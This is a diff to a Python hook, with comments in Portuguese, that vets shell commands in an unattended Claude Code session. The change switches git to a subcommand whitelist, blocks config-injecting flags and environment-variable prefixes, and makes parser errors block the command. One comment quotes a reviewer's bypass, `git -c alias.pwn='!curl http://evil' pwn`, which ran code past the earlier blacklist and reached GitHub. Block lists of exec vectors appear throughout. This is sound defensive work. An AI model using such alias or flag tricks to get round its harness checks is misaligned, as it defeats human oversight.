@@ -63,13 +63,15 @@ SAEM_DA_MAQUINA = {
     "invoke-webrequest", "iwr",
 }
 
-# Subcomando barrado, por programa. `git push` e o caso que originou tudo isto.
-# `git config` esta aqui porque um `git config diff.noprefix true` cegaria para
-# sempre a trava que le o diff (ver execucao.diff_para_a_trava).
+# Subcomando barrado, por programa.
+#
+# `git` NAO esta aqui, e isso e deliberado: lista negra de `git` sempre perde.
+# Medido em 25/08/2026 pelo revisor de seguranca, e reproduzido por mim:
+# `git -c alias.pwn='!curl http://evil' pwn` passava liso pela lista negra e
+# fazia o git executar o alias por um shell que esta barreira nunca leria —
+# de dentro dele, `git remote add` + `git push` alcancavam o GitHub de verdade.
+# `git` tem lista BRANCA de subcomando, em GIT_SUBCOMANDO_OK.
 SUBCOMANDO_BARRADO = {
-    "git": {"push", "remote", "clone", "fetch", "pull", "submodule", "daemon",
-            "filter-branch", "config", "credential", "send-email", "svn",
-            "request-pull", "instaweb", "archive"},
     "npm": {"install", "i", "ci", "add", "publish", "exec", "login", "adduser",
             "token", "audit", "update", "link"},
     "pnpm": {"install", "i", "add", "publish", "dlx", "update", "link"},
@@ -77,6 +79,25 @@ SUBCOMANDO_BARRADO = {
     "dotnet": {"nuget", "restore", "publish", "tool"},
     "go": {"get", "install", "mod"},
     "cargo": {"publish", "install", "login", "add", "update", "fetch"},
+}
+
+# Lista BRANCA de subcomando do `git`. O que nao esta aqui nao roda — inclusive
+# subcomando que ainda nao existe na versao de git desta maquina.
+GIT_SUBCOMANDO_OK = {
+    "status", "diff", "add", "commit", "log", "show", "checkout", "switch",
+    "restore", "branch", "stash", "rev-parse", "ls-files", "ls-tree", "blame",
+    "describe", "tag", "merge-base", "cat-file", "apply", "reset", "rm", "mv",
+    "grep", "shortlog", "name-rev", "symbolic-ref", "cherry", "count-objects",
+    "check-ignore", "verify-pack", "whatchanged",
+}
+
+# Bandeira GLOBAL do git que executa programa de fora, ou muda de arvore. `-c`
+# e `--config-env` definem config inline: com elas, `alias.x`, `core.pager`,
+# `core.fsmonitor`, `diff.external` e `uploadpack.packObjectsHook` viram
+# execucao de codigo arbitrario por fora desta barreira.
+GIT_BANDEIRA_GLOBAL_BARRADA = {
+    "-c", "--config-env", "--exec-path", "--upload-pack", "--receive-pack",
+    "--paginate", "-p", "--pager", "--git-dir", "--work-tree", "--namespace",
 }
 
 # `python -m X`: so estes X. Sem isto, `python -m pip install` e `python -m
@@ -201,7 +222,10 @@ def _argumentos(palavras: list) -> list:
 
 # --------------------------------------------------------- regras de caminho
 
-_ABSOLUTO = re.compile(r"^(/|~|[A-Za-z]:[\\/]|\\\\)")
+# `C:` SEM barra tambem entra: no Windows, `cat C:segredo.txt` resolve contra o
+# diretorio corrente do drive C, que nao e a copia. Achado do revisor em
+# 25/08/2026 — o regex antigo exigia a barra e deixava `C:segredo.txt` passar.
+_ABSOLUTO = re.compile(r"^(/|~|[A-Za-z]:|\\\\)")
 
 # Trecho entre aspas, para poder apaga-lo antes de procurar operador de shell.
 _ASPAS = re.compile(r"'[^']*'" + r'|"[^"]*"')
@@ -249,6 +273,14 @@ def vetar_bash(comando: str) -> str:
         palavras = _palavras(fatia)
         if not palavras:
             continue
+        # Prefixo `NOME=valor` antes do programa. Parece inofensivo e nao e:
+        # `GIT_EXTERNAL_DIFF=x git diff`, `GIT_SSH_COMMAND=x`, `LD_PRELOAD=x`
+        # mandam o programa da lista branca executar outro programa. Nenhuma
+        # sessao honesta da fila precisa disso — recusar custa pouco.
+        if re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", palavras[0]):
+            return ("`%s` define variável de ambiente antes do comando, e isso "
+                    "faz o programa executar outro por fora desta barreira."
+                    % palavras[0].split("=", 1)[0])
         programa = _programa(palavras)
         if not programa:
             continue
@@ -288,19 +320,65 @@ def _vetar_argumentos(programa: str, argumentos: list) -> str:
             return ("`python -m %s` não está liberado; só %s."
                     % (modulo or "(vazio)", ", ".join(sorted(MODULOS_OK))))
 
-    # TODA palavra solta e comparada, e nao so a primeira: `git -C pasta push`
+    if programa == "git":
+        return _vetar_git(argumentos)
+
+    # TODA palavra solta e comparada, e nao so a primeira: `npm -x pasta install`
     # tem "pasta" como primeiro nao-hifen, e um `next(...)` ingenuo deixaria o
-    # `push` passar. O preco e recusar `git commit -m "push"`, e a mensagem de
+    # `install` passar. O preco e recusar `npm run "install"`, e a mensagem de
     # recusa diz qual palavra foi — troca boa para o lado que erra fechando.
     barrados = SUBCOMANDO_BARRADO.get(programa, set())
     for a in argumentos:
         if a.startswith("-") or a.lower() not in barrados:
             continue
-        if programa == "git" and a.lower() in ("push", "remote", "fetch",
-                                               "pull", "clone"):
-            return ("`git %s` alcança o repositório de verdade. Quem publica "
-                    "é o painel, depois, com o diff já aprovado pelas travas." % a)
         return "`%s %s` não é permitido na sessão da fila." % (programa, a)
+    return ""
+
+
+# Subcomando de git que alcanca outra maquina. Nao esta na lista branca; existe
+# so para a recusa dizer o motivo de verdade em vez de "nao esta na lista".
+GIT_ALCANCA_A_REDE = ("push", "remote", "fetch", "pull", "clone", "submodule",
+                      "send-email", "request-pull", "daemon", "credential",
+                      "svn", "instaweb")
+
+
+def _vetar_git(argumentos: list) -> str:
+    """Lista BRANCA de subcomando, e nenhuma bandeira global que execute algo.
+
+    O `git` e o unico programa da lista branca que sabe rodar outro programa a
+    partir da PROPRIA configuracao (`alias`, `core.pager`, `diff.external`).
+    Por isso ele e o unico que a barreira le com lista branca: a lista negra
+    protege o que ela conhece, e `git -c` inventa capacidade nova a cada versao.
+    """
+    # A bandeira perigosa e procurada em TODA palavra, antes e depois do
+    # subcomando: nao aposto na minha leitura de onde o git aceita cada uma.
+    for a in argumentos:
+        if a.split("=", 1)[0] in GIT_BANDEIRA_GLOBAL_BARRADA:
+            return ("`git %s` deixa o git executar programa de fora (alias, pager, "
+                    "diff externo) — e aí esta barreira já não estaria lendo nada."
+                    % a.split("=", 1)[0])
+
+    espera_valor = False
+    for a in argumentos:
+        if espera_valor:
+            espera_valor = False
+            continue
+        if not a.startswith("-"):
+            baixo = a.lower()
+            if baixo in GIT_ALCANCA_A_REDE:
+                return ("`git %s` alcança o repositório de verdade. Quem publica "
+                        "é o painel, depois, com o diff já aprovado pelas travas." % a)
+            if baixo not in GIT_SUBCOMANDO_OK:
+                return ("`git %s` não está na lista do que a sessão da fila pode "
+                        "rodar sozinha." % a)
+            return ""
+        base = a.split("=", 1)[0]
+        # `-C pasta` come a proxima palavra; sem isto, `git -C x status` leria
+        # "x" como subcomando e recusaria um comando honesto. O caminho em si
+        # ainda passa por caminho_suspeito, em vetar_bash.
+        if base == "-C" and "=" not in a:
+            espera_valor = True
+    # `git` sozinho, ou so com `--version`/`--help`: nao executa nada.
     return ""
 
 
@@ -341,7 +419,16 @@ def main(entrada=None, saida_erro=None) -> int:
     except (ValueError, OSError) as e:
         saida_erro.write("barreira: nao consegui ler o evento (%s)\n" % e)
         return 2
-    motivo = decidir(evento)
+    # Qualquer erro AQUI barra. `decidir` e um parser de shell escrito a mao:
+    # ele VAI ter bug, e sem este try um TypeError sairia com codigo 1 — que o
+    # Claude Code trata como LIBERADO. Bug no porteiro viraria porta aberta, em
+    # silencio, numa sessao que roda sem ninguem olhando.
+    try:
+        motivo = decidir(evento)
+    except Exception as e:
+        saida_erro.write("barreira: erro ao julgar o comando (%s: %s) — "
+                         "barrando por precaucao\n" % (type(e).__name__, e))
+        return 2
     if motivo:
         saida_erro.write("Barrado pela barreira da fila: %s\n" % motivo)
         return 2
